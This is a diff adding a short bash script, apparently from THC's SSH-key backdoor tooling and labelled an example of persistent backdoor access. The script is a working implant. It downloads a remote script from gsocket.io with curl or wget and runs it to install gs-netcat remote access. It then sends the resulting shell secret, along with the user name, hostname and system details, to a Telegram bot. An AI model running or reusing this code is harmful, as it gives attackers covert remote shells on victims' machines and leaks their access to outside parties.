@@ -1,0 +1,42 @@
+#! /bin/bash
+
+# YOU ARE WRONG HERE. YOU DO NOT NEED THIS SCRIPT.
+# EDIT ssh-key-backdoor.sh INSTEAD.
+#
+# This is an example script to demonstrate how ssh keys can be used to
+# as a permanent backdoor and to move laterally through a network.
+#
+# If you find this on your network then somebody tested our tool and
+# forgot to change the script's URL. Contact us at root@proton.thc.org.
+
+# Telegram Bot Token and Chat ID
+# Replace these with your own Telegram Bot Token and Chat ID
+BOT_TOKEN="YOUR_BOT_TOKEN_HERE"
+CHAT_ID="YOUR_CHAT_ID_HERE"
+
+# Install GS-NETCAT and report installation back to Telegram.
+command -v curl >/dev/null && IS_CURL=1 || command -v wget >/dev/null && IS_WGET=1 || exit 0
+if [[ -n $IS_CURL ]]; then
+    S="$(bash -c "$(curl -fsSL gsocket.io/x)")"
+else
+    S="$(bash -c "$(wget --no-verbose -O- gsocket.io/x)")"
+fi
+S=${S##*S=\"}
+S=${S%%\"*}
+X=($(hostname; uname -mrs))
+MSG="${USER} ${X[*]} -- gs-netcat -i -s${S:-BAD}"
+
+# Prepare message to send to Telegram
+DATA="Chat ID: ${CHAT_ID}, Message: ${MSG}"
+
+# Send message to Telegram using Bot API
+if [[ -n $IS_CURL ]]; then
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+        -d "chat_id=${CHAT_ID}" \
+        -d "text=${DATA}"
+else
+    wget -q --post-data="chat_id=${CHAT_ID}&text=${DATA}" \
+        "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
+fi
+
+exit 0
